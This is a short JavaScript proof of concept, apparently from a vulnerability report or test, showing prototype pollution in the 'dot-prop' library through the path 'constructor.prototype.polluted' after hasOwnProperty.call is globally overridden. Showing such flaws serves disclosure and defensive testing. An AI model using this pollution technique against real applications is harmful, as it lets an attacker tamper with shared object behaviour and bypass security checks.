Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dotProp = require('dot-prop');
dotProp.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);